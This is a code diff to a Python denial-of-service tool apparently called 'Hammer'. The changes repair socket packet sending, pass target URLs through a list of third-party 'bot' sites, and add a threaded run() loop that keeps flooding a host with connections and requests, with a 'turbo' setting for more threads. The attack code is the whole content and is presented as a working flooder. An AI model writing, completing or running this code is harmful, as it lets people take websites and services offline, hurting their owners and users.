@@ -5,6 +5,7 @@ import socket
 import urllib.request
 import time
 import random
+import threading
 
 class FontColors:
     """
@@ -130,12 +131,12 @@ class Hammer:
         
         try:
             while True:
-                packet = self.packet_creator()
+                packet = self.packet_creator().encode('utf-8')
                 h_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 h_socket.connect((self.server, self.port))
                 if h_socket.sendto(packet, (self.server, self.port)):
                     h_socket.shutdown(1)
-                    print(f"{FontColors.green(time.ctime)}", FontColors.green("<< Harrming Pcket Send << endl"))
+                    print(f"{FontColors.blue(time.ctime())}", FontColors.green("<< Harrming Pcket Send << endl"))
                 else:
                     h_socket.shutdown(1)
                 time.sleep(.1)
@@ -168,7 +169,7 @@ Connection: {DefaultHttpParameters.Headers.Connection}
         
         while True:
             self.queue_two.get()
-            self.bot_hammering()
+            self.bot_hammering(random.choice(self.hammer_bots)+"http://"+self.server)
             self.queue_two.task_done()
     
     def bot_hammering(self, url):
@@ -182,4 +183,31 @@ Connection: {DefaultHttpParameters.Headers.Connection}
                 time.sleep(.1)
         except:
             time.sleep(.1)
+    
+    def run(self):
+        """Run Attacks"""
         
+        print(FontColors.green(f"host: {self.server} port: {self.port} turbo: {self.turbo}"))
+        print(FontColors.yellow("Hammer Attack will start 10 second later ..."))
+        time.sleep(10)
+
+        while True:
+            for _ in range(self.turbo):
+                threading.Thread(target=self.server_down_attack, daemon=True).start()
+                threading.Thread(target=self.server_bot_harrming_attack, daemon=True).start()
+            
+            time_start = time.time()
+            task_count = 0
+            while True:
+                if (task_count > 1800):
+                    task_count = 0
+                    time.sleep(.1)
+                task_count += 1
+                self.queue_one.put(task_count)
+                self.queue_two.put(task_count)
+
+
+if __name__ == "__main__":
+    
+    h = Hammer("localhost", 8000)
+    h.run()
